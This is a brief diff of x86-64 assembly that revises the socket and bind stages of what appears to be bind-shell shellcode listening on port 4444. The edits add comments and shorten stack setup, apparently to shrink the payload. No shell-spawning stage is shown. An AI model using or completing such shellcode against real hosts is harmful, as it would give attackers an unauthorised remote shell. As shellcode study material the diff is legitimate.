@@ -12,6 +12,7 @@ socket:
     ; AF_INET = 2
     ; SOCK_STREAM = 1
     ; __NR_socket = 41
+    ; On success, a file descriptor for the new socket is returned
 
     push 41
     pop rax
@@ -44,16 +45,16 @@ bind:
     ; __NR_bind = 49
 
     xor eax, eax  ; shorter and will still zero the upper bytes
-    push rax
-    mov dword [rsp-4], eax
-    sub rsp, 4
+    push rax      ; sin_zero
+    push ax
+    push ax       ; sin_addr
     push word 0x5c11  ; htons(4444)
     push word 2
 
     ; bind
     add al, 49
     mov rsi, rsp
-    add dl, 16  ; sizeof(sockaddr_in)
+    add dl, 16    ; sizeof(sockaddr_in)
     syscall
 
 listen:
